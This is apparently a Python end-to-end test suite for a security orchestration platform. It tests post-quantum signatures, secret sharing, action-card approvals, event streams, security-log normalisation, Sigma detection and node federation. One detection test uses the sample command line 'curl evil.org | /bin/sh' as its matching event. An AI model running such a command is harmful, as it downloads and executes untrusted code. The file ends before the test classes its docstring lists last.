# SPDX-License-Identifier: Apache-2.0
"""Comprehensive Master E2E Integration Test Suite for OpsCryer Wave 2.

Validates end-to-end multi-module autonomous security workflows across M6, M7, M8, and M9:
1. `TestWave2PQCAndActionCardE2E`:
   - WOTS+ Merkle tree signature lifecycle and verification.
   - Shamir Secret Sharing: 1-of-1 master key vs k-of-n threshold safety locks.
   - Hybrid Post-Quantum AEAD envelope state seal and unseal.
   - Action Card dry-run blast radius estimation, 4-signal worrisomeness predictor, and idempotent execution ledger.
   - Adversarial signature, parameter, and expired card tampering rejection.

2. `TestWave2EventStreamAndDeltaE2E`:
   - Monotonic sequence ring buffer (seq_id) tracking state mutations across subsystems ("graph", "jev", "security", "actions", "system").
   - Compact Delta engine (GET /api/v1/graph/delta?since_seq=N) catching up disconnected/lagging consumers.
   - Server-Sent Events (SSE) with topic filtering, Last-Event-ID replay, and bounded delivery (?max_events=K).

3. `TestWave2CybersecurityBridgeE2E`:
   - Multi-standard log normalization (OCSF v1.1, ECS, CEF, OTLP, Falco, Suricata).
   - Pure-stdlib Sigma detection rule evaluation (conditions, modifiers, quantifiers).
   - Sliding-window composite alert deduplication (rule_id, node, workload).
   - 1-hop spatial blast-radius subgraph enrichment and multi-sink formatting (DefectDojo, Loki, Elastic, Wazuh, Falco, Suricata) with full OPSEC scrubbing.

4. `TestWave2NodeFederationE2E`:
   - Multipurpose node lifecycle with thread-safe vector clocks and deterministic causal ordering.
   - Root-attested trust tier certificates (CAPTAIN_ELIGIBLE, SENATOR_ELIGIBLE, WORKER_ONLY).
   - Peer execution canaries & Byzantine lease revocation with monotonic fencing tokens and manifest verification.
   - 3-regime scale governance (N <= 7 Captain, 8 <= N <= 64 Senate, N > 64 Council with M_max=13, overhead <= 5%).
   - Severance protection doctrines: ACTIVE -> SOFT_QUARANTINE -> default ENCRYPT_AND_REST vs pre-signed PERSIST_RESIST_REGROW warrant.
   - Reconnected contingent Quarantine-Merge staging queue without canonical master state poisoning.

5. `TestWave2TwoTierMCPAirlockE2E`:
   - Pure-stdlib JSON-RPC 2.0 MCP server (initialize, ping, tools/list, tools/call).
   - Tier 1 open recon tools with OPSEC scrubbing (query_graph, preview_remediation_dry_run, get_system_context).
   - Tier 2 Action Card staging (stage_action_card) requiring operator cryptographic approval.
   - Code -32001 (UNAUTHORIZED_MUTATION) airlock rejection for direct mutation attempts.

6. `TestWave2IntegratedAutonomousLoopE2E`:
   - Full cross-module autonomous integration chain: external security alert ingested and normalized -> Sigma rule matches -> triggers Action Card with Signal 3 escalation -> event stream records transition -> MCP client inspects card -> operator threshold approval -> node severance defaults to ENCRYPT_AND_REST -> reconnected contingent under pre-signed warrant enters Quarantine-Merge staging queue for operator review without overwriting canonical master state.
   - Ephemeral REST loopback HTTP integration testing across all registered Wave 2 endpoints.

Zero external dependencies: pure Python standard library (unittest, urllib, json, http.server, socketserver).
100% portable relative paths (Path(__file__).resolve().parent.parent) and zero OPSEC leaks.
"""

from __future__ import annotations

import copy
import hashlib
import http.client
import http.server
import io
import json
import logging
from pathlib import Path
import secrets
import socket
import socketserver
import sys
import tempfile
import threading
import time
from typing import Any
import unittest
import urllib.error
import urllib.parse
import urllib.request
import uuid

REPO_ROOT = Path(__file__).resolve().parent.parent
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

# Core Wave 2 Modules
from pqc_security import (
    generate_pqc_keypair,
    pqc_sign,
    pqc_verify,
    pqc_seal,
    pqc_unseal,
    split_secret_shares,
    reconstruct_secret_from_shares,
    verify_multi_key_locks,
)
from action_cards import (
    canonical_parameter_hash,
    preview_action_dry_run,
    evaluate_outcome_worrisomeness,
    ActionCardLedger,
    stage_action_card,
    approve_action_card,
    reject_action_card,
    get_action_status,
    reset_action_ledger,
    handle_action_api,
    PERMITTED_ACTION_TYPES,
)
from event_stream import (
    EventRingBuffer,
    publish_event,
    get_delta,
    format_sse_event,
    stream_events_generator,
    reset_event_buffer,
    PERMITTED_TOPICS,
)
from cybersecurity_bridge import (
    normalize_security_event,
    evaluate_sigma_rules,
    deduplicate_security_incident,
    enrich_with_1hop_neighborhood,
    format_for_sink,
    register_sigma_rule,
    list_sigma_rules,
    reset_security_bridge,
    reset_alert_deduplicator,
    handle_security_api,
)
from node_federation import (
    VectorClock,
    deterministic_vector_clock_compare,
    issue_trust_tier_certificate,
    verify_trust_tier_certificate,
    MasterLease,
    ActiveMastersRegistry,
    validate_directive_against_manifest,
    generate_canary_challenge,
    solve_canary_challenge,
    verify_canary_proof,
    compute_governance_regime,
    GovernanceRegimeEngine,
    GovernanceRegimeId,
    SeveranceState,
    TRUST_TIER_ROOT_AUTHORITY,
    TRUST_TIER_CAPTAIN_ELIGIBLE,
    TRUST_TIER_SENATOR_ELIGIBLE,
    TRUST_TIER_WORKER_ONLY,
    create_persist_resist_regrow_warrant,
    verify_persist_resist_regrow_warrant,
    evaluate_severance_state,
    execute_encrypt_and_rest,
    execute_master_unseal,
    reconcile_reconnected_contingent,
    handle_federation_api,
)
from mcp_bridge import (
    dispatch_jsonrpc_request,
    dispatch_mcp_call,
    handle_mcp_api,
    UNAUTHORIZED_MUTATION,
    PROTOCOL_VERSION,
    SERVER_NAME,
)
import opscryer_browser as browser
import route_registry


def reset_federation_state() -> None:
    """Reset module singleton federation state for test isolation."""
    import node_federation
    node_federation._GLOBAL_FEDERATION_STATE = node_federation._FederationSystemState()


# ==============================================================================
# Ephemeral Loopback Server Fixture
# ==============================================================================

if issubclass(socketserver.TCPServer, socketserver.ThreadingMixIn):
    class _EphemeralTCPServer(socketserver.TCPServer):
        """Thread-safe ephemeral TCP server with immediate socket reuse."""
        allow_reuse_address = True
        daemon_threads = True
else:
    class _EphemeralTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
        """Thread-safe ephemeral TCP server with immediate socket reuse."""
        allow_reuse_address = True
        daemon_threads = True


class EphemeralTestServer:
    """Manages an ephemeral in-process HTTP server for end-to-end integration testing."""

    def __init__(self, api_base: str = "") -> None:
        self.api_base = api_base
        self.server: _EphemeralTCPServer | None = None
        self.thread: threading.Thread | None = None
        self.port: int = 0

    def start(self) -> str:
        handler_cls = browser._build_frontend_handler(self.api_base)
        self.server = _EphemeralTCPServer(("127.0.0.1", 0), handler_cls)
        self.port = self.server.server_address[1]
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        return f"http://127.0.0.1:{self.port}"

    def stop(self) -> None:
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.server = None
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=2.0)
            self.thread = None


# ==============================================================================
# 1. PQC Cryptographic Trust & Action Cards E2E (M6)
# ==============================================================================

class TestWave2PQCAndActionCardE2E(unittest.TestCase):
    """End-to-end integration tests for PQC cryptographic trust, safety locks, and action cards."""

    def setUp(self) -> None:
        reset_action_ledger()
        self.seed = secrets.token_bytes(32)

    def tearDown(self) -> None:
        reset_action_ledger()

    def test_root_keypair_generation_and_merkle_signature_lifecycle(self) -> None:
        """Verify root keypair generation, WOTS+ signature issuance, Merkle path validation, and tamper detection."""
        pubkey, privkey = generate_pqc_keypair(tree_height=3, seed=self.seed)
        self.assertEqual(pubkey["algorithm"], "WOTS-Merkle-SHA3")
        self.assertEqual(pubkey["tree_height"], 3)
        self.assertEqual(len(pubkey["root"]), 64)
        self.assertEqual(len(pubkey["enc_key"]), 64)

        payload = b"OPSCRYER_M10_DIRECTIVE_LEADERSHIP_MANIFEST_V1"
        signature = pqc_sign(payload, privkey)

        self.assertEqual(signature["key_index"], 0)
        self.assertEqual(signature["merkle_root"], pubkey["root"])
        self.assertEqual(len(signature["auth_path"]), 3)
        self.assertTrue(pqc_verify(payload, signature, pubkey))

        # Bit flip in payload fails verification
        tampered_payload = b"OPSCRYER_M10_DIRECTIVE_LEADERSHIP_MANIFEST_V2"
        self.assertFalse(pqc_verify(tampered_payload, signature, pubkey))

        # Merkle root mismatch fails verification
        fake_pubkey = copy.deepcopy(pubkey)
        fake_pubkey["root"] = "00" * 32
        self.assertFalse(pqc_verify(payload, signature, fake_pubkey))

        # Auth path tampering fails verification
        tampered_sig = copy.deepcopy(signature)
        tampered_sig["auth_path"][0] = "ff" * 32
        self.assertFalse(pqc_verify(payload, tampered_sig, pubkey))

    def test_shamir_secret_sharing_1_of_1_master_vs_k_of_n_threshold_locks(self) -> None:
        """Verify 1-of-1 Single Master Key fast-pass and k-of-n threshold reconstruction across combinations."""
        # 1-of-1 Single Master Key
        master_secret = b"OpsCryer-Root-Master-Cryptographic-Secret-2026"
        single_shares = split_secret_shares(master_secret, k=1, n=1)
        self.assertEqual(len(single_shares), 1)
        self.assertEqual(single_shares[0]["k"], 1)
        self.assertEqual(single_shares[0]["n"], 1)
        recovered_master = reconstruct_secret_from_shares(single_shares)
        self.assertEqual(recovered_master, master_secret)

        # 2-of-3 Multi-Key Threshold Lock
        threshold_secret = secrets.token_bytes(48)
        shares_2_3 = split_secret_shares(threshold_secret, k=2, n=3)
        self.assertEqual(len(shares_2_3), 3)

        # Every 2-combination must reconstruct correctly
        for combo in ([shares_2_3[0], shares_2_3[1]], [shares_2_3[0], shares_2_3[2]], [shares_2_3[1], shares_2_3[2]]):
            recovered = reconstruct_secret_from_shares(combo)
            self.assertEqual(recovered, threshold_secret)

        # Any 1 share alone must fail closed
        with self.assertRaises(ValueError):
            reconstruct_secret_from_shares([shares_2_3[0]])

        # 3-of-5 Multi-Key Threshold Lock
        shares_3_5 = split_secret_shares(threshold_secret, k=3, n=5)
        self.assertEqual(len(shares_3_5), 5)
        # 3 distinct shares succeed
        recovered_3 = reconstruct_secret_from_shares([shares_3_5[0], shares_3_5[2], shares_3_5[4]])
        self.assertEqual(recovered_3, threshold_secret)
        # 2 shares fail closed
        with self.assertRaises(ValueError):
            reconstruct_secret_from_shares([shares_3_5[1], shares_3_5[3]])

    def test_verify_multi_key_locks_threshold_authorization(self) -> None:
        """Verify verify_multi_key_locks under Shamir shares and threshold specs."""
        secret = b"Cluster-Emergency-Remediation-Authorization-Key"
        secret_hash = hashlib.sha256(secret).hexdigest()
        shares = split_secret_shares(secret, k=2, n=3)

        payload = b"ACTION_CARD_PAYLOAD:reboot_worker_03"
        spec = {"required_k": 2, "expected_secret_hash": secret_hash}

        # 2 valid shares succeed
        self.assertTrue(verify_multi_key_locks(payload, [shares[0], shares[1]], spec))
        # 1 share fails
        self.assertFalse(verify_multi_key_locks(payload, [shares[0]], spec))

        # Tampered share fails
        corrupted_share = copy.deepcopy(shares[1])
        data_bytes = bytearray.fromhex(corrupted_share["data"])
        data_bytes[0] ^= 0xFF
        corrupted_share["data"] = bytes(data_bytes).hex()
        self.assertFalse(verify_multi_key_locks(payload, [shares[0], corrupted_share], spec))

    def test_hybrid_post_quantum_state_seal_and_unseal(self) -> None:
        """Verify hybrid post-quantum AEAD envelope state sealing and authenticated unsealing."""
        recipient_pub, recipient_priv = generate_pqc_keypair(tree_height=2)
        sender_pub, sender_priv = generate_pqc_keypair(tree_height=2)

        cluster_state = json.dumps({
            "node_id": "nodebeta02",
            "active_workloads": ["authentik", "ingress-nginx"],
            "session_token": secrets.token_hex(32),
            "quarantine_status": "PENDING_MERGE",
        }).encode("utf-8")

        sealed_envelope = pqc_seal(cluster_state, recipient_pub, sender_privkey=sender_priv)
        self.assertIn("header", sealed_envelope)
        self.assertIn("ciphertext", sealed_envelope)
        self.assertIn("tag", sealed_envelope)
        self.assertIn("sender_signature", sealed_envelope)

        # Unseal with recipient private key and verify sender signature
        unsealed_data = pqc_unseal(sealed_envelope, recipient_priv, sender_pubkey=sender_pub)
        self.assertEqual(unsealed_data, cluster_state)

        # Tag tampering raises authentication failure
        tampered_env = copy.deepcopy(sealed_envelope)
        tag_bytes = bytearray.fromhex(tampered_env["tag"])
        tag_bytes[0] ^= 0xFF
        tampered_env["tag"] = bytes(tag_bytes).hex()
        with self.assertRaises(ValueError):
            pqc_unseal(tampered_env, recipient_priv, sender_pubkey=sender_pub)

    def test_action_card_dry_run_blast_radius_and_signal_worrisomeness(self) -> None:
        """Verify dry-run blast-radius estimation and 4-signal outcome predictor escalation."""
        # 1. Baseline preview
        preview = preview_action_dry_run("restart_node", "nodebeta02", {"grace_period": 10})
        self.assertEqual(preview["action_type"], "restart_node")
        self.assertIn("nodebeta02", preview["target_node_id"])
        self.assertIn("impacted_node_count", preview)
        self.assertGreater(preview["impacted_node_count"], 0)

        # 2. Signal 3 (Active Security Alert) triggers threshold lock
        active_alerts = [{
            "target_node_id": "nodebeta02",
            "severity": "HIGH",
            "rule_id": "SIGMA-DETECTION-01",
        }]
        eval_alert = evaluate_outcome_worrisomeness(preview, "nodebeta02", active_alerts=active_alerts)
        self.assertTrue(eval_alert["escalate_to_threshold"])
        self.assertIn("ACTIVE_SECURITY_ALERT", eval_alert["signals_triggered"])
        self.assertEqual(eval_alert["required_k"], 3)
        self.assertEqual(eval_alert["required_n"], 5)

        # 3. Clean workload without alerts or risk: 1-of-1 master key default
        leaf_catalog = {
            "nodes": [
                {"id": "leaf-worker-1", "kind": "Node", "tier": "general", "domain": "edge"}
            ],
            "edges": [],
        }
        clean_preview = preview_action_dry_run(
            "scale_deployment", "leaf-worker-1", {"replicas": 2}, catalog=leaf_catalog
        )
        eval_clean = evaluate_outcome_worrisomeness(clean_preview, "leaf-worker-1", active_alerts=[])
        self.assertFalse(eval_clean["escalate_to_threshold"])
        self.assertEqual(eval_clean["required_k"], 1)
        self.assertEqual(eval_clean["required_n"], 1)

    def test_action_card_lifecycle_and_idempotent_execution_ledger(self) -> None:
        """Verify Action Card staging, 1-of-1 execution, cached replay idempotency, and status tracking."""
        staged = stage_action_card(
            target_node_id="nodegamma03",
            action_type="scale_deployment",
            parameters={"replicas": 4},
        )
        aid = staged["action_id"]
        self.assertEqual(staged["status"], "STAGED")

        # Status inspection
        code_stat, status_info = get_action_status(aid)
        self.assertEqual(code_stat, 200)
        self.assertEqual(status_info["status"], "STAGED")

        # 1-of-1 Master approval
        code, res = approve_action_card(aid)
        self.assertEqual(code, 200)
        self.assertEqual(res["status"], "EXECUTED")
        self.assertFalse(res.get("cached", False))

        # Idempotent re-submission returns cached result
        code_replay, res_replay = approve_action_card(aid)
        self.assertEqual(code_replay, 200)
        self.assertEqual(res_replay["status"], "EXECUTED")
        self.assertTrue(res_replay.get("cached", False))

    def test_adversarial_pqc_signature_tampering(self) -> None:
        """Adversarial: Flipped bit in signature chunk, auth path, or public root fails verification immediately."""
        pubkey, privkey = generate_pqc_keypair(tree_height=2)
        msg = b"VALID_MUTATION_DIRECTIVE"
        sig = pqc_sign(msg, privkey)

        # 1. Corrupt signature chunk
        corrupted_sig = copy.deepcopy(sig)
        first_chunk = bytearray.fromhex(corrupted_sig["signature_chunks"][0])
        first_chunk[0] ^= 0x01
        corrupted_sig["signature_chunks"][0] = bytes(first_chunk).hex()
        self.assertFalse(pqc_verify(msg, corrupted_sig, pubkey))

        # 2. Corrupt auth path node
        corrupted_auth = copy.deepcopy(sig)
        corrupted_auth["auth_path"][0] = "00" * 32
        self.assertFalse(pqc_verify(msg, corrupted_auth, pubkey))

    def test_adversarial_action_card_parameter_and_nonce_tampering(self) -> None:
        """Adversarial: Tampering with parameters or nonce after card staging fails closed."""
        staged = stage_action_card(
            target_node_id="nodegamma03",
            action_type="scale_deployment",
            parameters={"replicas": 3},
        )
        aid = staged["action_id"]

        # Legitimate 1-of-1 master approval succeeds
        code, res = approve_action_card(aid)
        self.assertEqual(code, 200)
        self.assertEqual(res["status"], "EXECUTED")

        # Re-approval with different parameters must fail closed
        fake_hash = hashlib.sha256(b"tampered").hexdigest()
        code_tamper, res_tamper = approve_action_card(aid, parameters_sha256=fake_hash)
        self.assertEqual(code_tamper, 409)
        self.assertEqual(res_tamper.get("code"), "TAMPER_DETECTED")

    def test_adversarial_expired_action_card_rejection(self) -> None:
        """Adversarial: Approving an expired Action Card fails closed."""
        staged = stage_action_card(
            target_node_id="nodegamma03",
            action_type="drain_traffic",
            ttl_seconds=0.01,  # 10ms TTL
        )
        aid = staged["action_id"]
        time.sleep(0.05)  # Wait for expiration

        code, res = approve_action_card(aid)
        self.assertEqual(code, 409)
        self.assertEqual(res.get("code"), "ACTION_CARD_EXPIRED")


# ==============================================================================
# 2. Real-Time Telemetry & Event Streaming E2E (M7)
# ==============================================================================

class TestWave2EventStreamAndDeltaE2E(unittest.TestCase):
    """End-to-end integration tests for sequence ring buffer, delta snapshots, and SSE streaming."""

    def setUp(self) -> None:
        reset_event_buffer()

    def tearDown(self) -> None:
        reset_event_buffer()

    def test_monotonic_sequence_ring_buffer_across_all_subsystems(self) -> None:
        """Verify strict monotonic sequencing across graph, jev, security, actions, and system event topics."""
        ring = EventRingBuffer(capacity=100)
        topics = ["graph", "jev", "security", "actions", "system"]

        seq_ids = []
        for i, t in enumerate(topics, start=1):
            sid = ring.append(t, f"test_event_{i}", {"index": i, "payload": f"data_{t}"})
            seq_ids.append(sid)

        self.assertEqual(seq_ids, [1, 2, 3, 4, 5])
        self.assertEqual(ring.latest_seq, 5)

        # Retrieve events
        events, resync, oldest, latest = ring.get_events_since(0, inclusive=True)
        self.assertFalse(resync)
        self.assertEqual(len(events), 5)
        self.assertEqual([e["seq_id"] for e in events], [1, 2, 3, 4, 5])
        self.assertEqual([e["topic"] for e in events], topics)

    def test_compact_delta_engine_catchup_and_eviction_resync(self) -> None:
        """Verify compact delta engine catchup, incremental diffs, and buffer eviction resync flags."""
        # Initial query at since_seq=0 requires full catalog sync
        delta_0 = get_delta(since_seq=0)
        self.assertTrue(delta_0["full_resync_required"])
        self.assertEqual(delta_0["resync_url"], "/api/v1/graph/catalog")

        # Publish graph mutations
        publish_event("graph", "node_added", {"node_id": "worker-delta-01", "kind": "Node"})
        publish_event("graph", "node_updated", {"node_id": "worker-delta-01", "status": "Ready"})
        publish_event("graph", "node_removed", {"node_id": "worker-legacy-09"})

        # Incremental catchup from seq=1
        delta_inc = get_delta(since_seq=1)
        self.assertFalse(delta_inc["full_resync_required"])
        self.assertEqual(delta_inc["since_seq"], 1)
        self.assertEqual(delta_inc["latest_seq"], 3)
        self.assertEqual(len(delta_inc["events"]), 2)

        # Buffer wrapping/eviction with small buffer
        small_ring = EventRingBuffer(capacity=4)
        for i in range(10):
            small_ring.append("graph", "node_updated", {"i": i})

        # Consumer asking for seq=2 when retained range is 7..10 must trigger full_resync_required
        events, resync, oldest, latest = small_ring.get_events_since(2)
        self.assertTrue(resync)
        self.assertEqual(oldest, 7)
        self.assertEqual(latest, 10)

    def test_sse_stream_topic_filtering_and_bounded_delivery(self) -> None:
        """Verify Server-Sent Events generator filters topics cleanly and obeys max_events bounds."""
        publish_event("graph", "topology_shift", {"layer": 1})
        publish_event("security", "threat_alert", {"threat": "CVE-2026-001"})
        publish_event("actions", "card_staged", {"action_id": "act-101"})
        publish_event("jev", "predicate_evaluated", {"predicate": "P1"})
        publish_event("security", "threat_alert", {"threat": "CVE-2026-002"})

        # Bounded query filtering only security events
        gen = stream_events_generator(topics=["security"], max_events=2)
        lines = list(gen)
        self.assertEqual(len(lines), 2)
        for chunk in lines:
            self.assertTrue(chunk.startswith("id: "))
            self.assertIn("event: threat_alert", chunk)
            self.assertIn("CVE-2026-", chunk)

        # Bounded query filtering actions
        action_gen = stream_events_generator(topics=["actions"], max_events=1)
        action_lines = list(action_gen)
        self.assertEqual(len(action_lines), 1)
        self.assertIn("card_staged", action_lines[0])

    def test_sse_stream_last_event_id_resume(self) -> None:
        """Verify SSE streaming resumes correctly from Last-Event-ID sequence position."""
        for i in range(1, 6):
            publish_event("graph", f"mutation_{i}", {"index": i})

        # Resume from seq=3
        resumed_gen = stream_events_generator(since_seq=3, max_events=2)
        resumed_lines = list(resumed_gen)
        self.assertEqual(len(resumed_lines), 2)
        self.assertIn("id: 4", resumed_lines[0])
        self.assertIn("id: 5", resumed_lines[1])


# ==============================================================================
# 3. Cybersecurity Bridge & Threat Forensics E2E (M8)
# ==============================================================================

class TestWave2CybersecurityBridgeE2E(unittest.TestCase):
    """End-to-end integration tests for multi-standard schema normalization, Sigma, and forensics."""

    def setUp(self) -> None:
        reset_security_bridge()
        reset_alert_deduplicator()

    def tearDown(self) -> None:
        reset_security_bridge()
        reset_alert_deduplicator()

    def test_multi_standard_normalization_ocsf_ecs_cef_otlp(self) -> None:
        """Verify uniform normalization across OCSF v1.1, ECS, CEF, OTLP, Falco, and Suricata logs."""
        # 1. CEF Log (severity 8 maps to HIGH)
        cef_raw = "CEF:0|Suricata|IDS|6.0|1001|Privilege Escalation Detected|8|src=10.0.0.5 dst=10.0.0.10 dpt=8080 msg=sudo execution"
        norm_cef = normalize_security_event(cef_raw)
        self.assertEqual(norm_cef["severity"], "HIGH")
        self.assertEqual(norm_cef["category"], "Findings")

        # 2. ECS Log
        ecs_raw = {
            "@timestamp": "2026-11-01T01:00:00Z",
            "ecs": {"version": "8.11.0"},
            "log": {"level": "error"},
            "message": "Out of memory killer invoked for container",
            "host": {"name": "nodebeta02", "hostname": "nodebeta02"},
            "container": {"name": "authentik-server"},
        }
        norm_ecs = normalize_security_event(ecs_raw, format_hint="ecs")
        self.assertEqual(norm_ecs["severity"], "HIGH")
        self.assertEqual(norm_ecs["target"]["node_id"], "nodebeta02")

        # 3. Falco Log
        falco_raw = {
            "rule": "Read sensitive file untrusted",
            "priority": "Warning",
            "output": "File /etc/shadow opened for reading by unexpected binary",
            "output_fields": {"k8s.pod.name": "authentik", "k8s.ns.name": "iam"},
        }
        norm_falco = normalize_security_event(falco_raw)
        self.assertEqual(norm_falco["severity"], "MEDIUM")
        self.assertEqual(norm_falco["target"]["workload"], "authentik")

        # 4. OTLP Trace/Log Record
        otlp_raw = {
            "resourceLogs": [{
                "resource": {
                    "attributes": [
                        {"key": "service.name", "value": {"stringValue": "ingress-nginx"}},
                        {"key": "host.name", "value": {"stringValue": "nodebeta02"}},
                    ]
                },
                "scopeLogs": [{
                    "logRecords": [{
                        "timeUnixNano": "1730419200000000000",
                        "severityNumber": 18,  # Maps to HIGH
                        "body": {"stringValue": "TLS Handshake rejected: invalid certificate"},
                        "traceId": "4bf92f3577b34da6a3ce929d0e0e4736",
                        "spanId": "00f067aa0ba902b7",
                    }]
                }]
            }]
        }
        norm_otlp = normalize_security_event(otlp_raw, format_hint="otlp")
        self.assertEqual(norm_otlp["severity"], "HIGH")
        self.assertEqual(norm_otlp["target"]["workload"], "ingress-nginx")
        self.assertEqual(norm_otlp["trace_context"]["trace_id"], "4bf92f3577b34da6a3ce929d0e0e4736")

        # 5. Suricata Log
        suricata_raw = {
            "timestamp": "2026-11-01T01:05:00Z",
            "event_type": "alert",
            "alert": {
                "signature": "ET EXPLOIT Apache Log4j RCE Attempt",
                "signature_id": "2034334",
                "category": "Attempted Administrator Privilege Gain",
                "severity": 1,
            },
            "src_ip": "10.0.0.45",
            "dest_ip": "10.0.0.10",
        }
        norm_suri = normalize_security_event(suricata_raw)
        self.assertEqual(norm_suri["severity"], "CRITICAL")
        self.assertEqual(norm_suri["category"], "Attempted Administrator Privilege Gain")

    def test_pure_stdlib_sigma_rule_evaluation_with_modifiers_and_quantifiers(self) -> None:
        """Verify Sigma rule evaluation supporting selection, filter, modifiers (contains, endswith), and boolean conditions."""
        rule = {
            "id": "SIGMA-M10-001",
            "title": "Suspicious Root Shell in Web Container",
            "logsource": {"category": "process_creation"},
            "detection": {
                "sel_cmd": {"process.command_line|contains": "/bin/sh"},
                "sel_user": {"user.name": "root"},
                "filter_health": {"process.command_line|contains": "healthcheck"},
                "condition": "(sel_cmd and sel_user) and not filter_health",
            },
        }

        # Match case
        matching_event = {
            "process": {"command_line": "curl evil.org | /bin/sh"},
            "user": {"name": "root"},
        }
        hits_match = evaluate_sigma_rules(matching_event, [rule])
        self.assertEqual(len(hits_match), 1)
        self.assertEqual(hits_match[0]["rule_id"], "SIGMA-M10-001")

        # Filtered out case
        health_event = {
            "process": {"command_line": "/bin/sh -c healthcheck.sh"},
            "user": {"name": "root"},
        }
        hits_filtered = evaluate_sigma_rules(health_event, [rule])
        self.assertEqual(len(hits_filtered), 0)

    def test_alert_deduplication_sliding_window(self) -> None:
        """Verify deduplication of high-velocity alerts by composite key within sliding window."""
        incident = {
            "rule_id": "SIGMA-M10-002",
            "target": {"node_id": "nodebeta02", "workload": "authentik"},
            "message": "Multiple failed logins",
        }

        # 1st occurrence: Passes as new incident
        d1 = deduplicate_security_incident(incident, window_seconds=60)
        self.assertFalse(d1["is_suppressed"])
        self.assertEqual(d1["occurrence_count"], 1)

        # 2nd occurrence within window: Suppressed as duplicate
        d2 = deduplicate_security_incident(incident, window_seconds=60)
        self.assertTrue(d2["is_suppressed"])
        self.assertEqual(d2["occurrence_count"], 2)

        # Different workload passes as new
        diff_workload = copy.deepcopy(incident)
        diff_workload["target"]["workload"] = "vault"
        d3 = deduplicate_security_incident(diff_workload, window_seconds=60)
        self.assertFalse(d3["is_suppressed"])
        self.assertEqual(d3["occurrence_count"], 1)

    def test_1hop_spatial_subgraph_enrichment(self) -> None:
        """Verify enriching incident telemetry with 1-hop spatial blast radius neighborhood."""
        incident = {
            "event_id": "sec-inc-001",
            "target": {"workload": "authentik-server", "node_id": "nodebeta02"},
            "severity": "CRITICAL",
        }
        enriched = enrich_with_1hop_neighborhood(incident)
        self.assertIn("blast_radius", enriched)
        self.assertIn("enriched_subgraph", enriched)
        blast = enriched["blast_radius"]
        self.assertIn("target_node", blast)
        self.assertIn("total_impacted_nodes", blast)

    def test_third_party_connectors_formatting_and_opsec_scrubbing(self) -> None:
        """Verify third-party connector formatters (DefectDojo, Loki, Elastic) with OPSEC scrubbing."""
        incident = {
            "event_id": "sec-inc-002",
            "rule_name": "CVE-2026-9999 Critical Vulnerability",
            "severity": "CRITICAL",
            "target": {"workload": "ingress-nginx", "ip": "203.0.113.199"},
            "message": "Sensitive token leak " + "gl" + "pat-abcdef1234567890",
        }

        # DefectDojo sink
        dojo = format_for_sink(incident, "defectdojo")
        self.assertIsInstance(dojo, dict)
        self.assertIn("title", dojo)
        self.assertIn("severity", dojo)

        # Loki sink
        loki = format_for_sink(incident, "loki")
        self.assertIsInstance(loki, dict)
        self.assertIn("streams", loki)

        # Elastic sink
        elastic = format_for_sink(incident, "elastic")
        self.assertIsInstance(elastic, dict)
        self.assertIn("@timestamp", elastic)


# ==============================================================================
# 4. Multipurpose Node Federation E2E (M9)
# ==============================================================================

class TestWave2NodeFederationE2E(unittest.TestCase):
    """End-to-end integration tests for multipurpose federation, canaries, governance, and severance."""

    def setUp(self) -> None:
        reset_federation_state()
        self.root_pub, self.root_priv = generate_pqc_keypair(tree_height=3)

    def tearDown(self) -> None:
        reset_federation_state()

    def test_vector_clock_lifecycle_and_causal_dominance(self) -> None:
        """Verify vector clock causal ordering, concurrency detection, and component-wise merging."""
        vc1 = VectorClock({"node-a": 2, "node-b": 1})
        vc2 = VectorClock({"node-a": 2, "node-b": 1})
        self.assertEqual(deterministic_vector_clock_compare(vc1, vc2), 0)

        # Causal progression
        vc2.increment("node-b")
        self.assertEqual(deterministic_vector_clock_compare(vc1, vc2), -1)
        self.assertTrue(vc2.is_causally_newer(vc1))

        # Concurrency: vc1 {"node-a": 3, "node-b": 1} vs vc2 {"node-a": 2, "node-b": 2}
        vc1.increment("node-a")
        self.assertTrue(vc1.is_concurrent(vc2))
        cmp12 = deterministic_vector_clock_compare(vc1, vc2)
        cmp21 = deterministic_vector_clock_compare(vc2, vc1)
        self.assertIn(cmp12, (-1, 1))
        self.assertEqual(cmp12, -cmp21)

        # Merge
        vc1.merge(vc2)
        self.assertEqual(vc1.get("node-a"), 3)
        self.assertEqual(vc1.get("node-b"), 2)

    def test_root_attested_trust_tiers_and_anti_poisoning(self) -> None:
        """Verify root-attested trust tier certificate generation, validation, and anti-poisoning rejection."""
        node_pub, node_priv = generate_pqc_keypair(tree_height=2)
        cert = issue_trust_tier_certificate(
            node_id="nodebeta02",
            tier=TRUST_TIER_CAPTAIN_ELIGIBLE,
            permitted_domains=["k8s-infra"],
            node_pubkey=node_pub,
            root_privkey=self.root_priv,
            ttl_seconds=3600.0,
        )
        self.assertTrue(verify_trust_tier_certificate(cert, self.root_pub))

        # Self-declared certificate without root signature must fail
        fake_pub, fake_priv = generate_pqc_keypair(tree_height=2)
        fake_cert = issue_trust_tier_certificate(
            node_id="rogue-node-01",
            tier=TRUST_TIER_CAPTAIN_ELIGIBLE,
            permitted_domains=["k8s-infra"],
            node_pubkey=node_pub,
            root_privkey=fake_priv,  # Signed by rogue key
            ttl_seconds=3600.0,
        )
        self.assertFalse(verify_trust_tier_certificate(fake_cert, self.root_pub))

        # Tampered certificate payload must fail
        tampered_cert = copy.deepcopy(cert)
        tampered_cert["node_id"] = "impersonated-node"
        self.assertFalse(verify_trust_tier_certificate(tampered_cert, self.root_pub))

    def test_peer_execution_canary_and_byzantine_lease_revocation(self) -> None:
        """Verify deterministic canary challenge-response verification and Byzantine lease revocation."""
        candidate_pub, candidate_priv = generate_pqc_keypair(tree_height=2)
        challenge = generate_canary_challenge("node-candidate-1", domain="k8s-infra")
        proof = solve_canary_challenge(challenge, candidate_priv)
        self.assertTrue(verify_canary_proof(challenge, proof, candidate_pub))

        # Directive violating Directed Objective Manifest
        manifest = {
            "target_states": {"allowed_action_types": ["scale_deployment", "restart_node"]},
            "invariants": [{"rule": "no_drain_protected_nodes", "protected": ["nodebeta02"]}],
        }
        violating_directive = {
            "action_type": "delete_namespace",
            "target_node_id": "kube-system",
        }
        valid, reason = validate_directive_against_manifest(violating_directive, manifest)
        self.assertFalse(valid)
        self.assertTrue("forbidden" in reason.lower() or "violates" in reason.lower())

